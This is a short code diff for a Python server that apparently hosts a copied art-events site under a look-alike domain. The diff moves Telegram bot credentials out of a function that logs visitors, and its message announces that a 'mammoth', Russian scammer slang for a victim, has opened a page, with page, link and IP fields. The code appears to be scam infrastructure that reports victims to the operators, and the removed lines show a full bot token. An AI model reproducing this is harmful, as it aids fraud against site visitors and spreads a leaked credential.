@@ -5,6 +5,7 @@ import os
 import sys
 from urllib.parse import urlparse, unquote
 import requests
+from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
 
 # Настройки сервера для artpullse.com
 PORT = 8080  # Используем порт 8080
@@ -12,9 +13,6 @@ DIRECTORY = "events-art.com"  # Папка с сайтом
 DOMAIN = "artpullse.com"  # Ваш домен
 
 def send_telegram_log(page, link, ip, country=""):
-    BOT_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
-    GROUP_ID = -4851128750  # ваш group id
-    ADMIN_ID = 7973971109   # ваш admin id
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
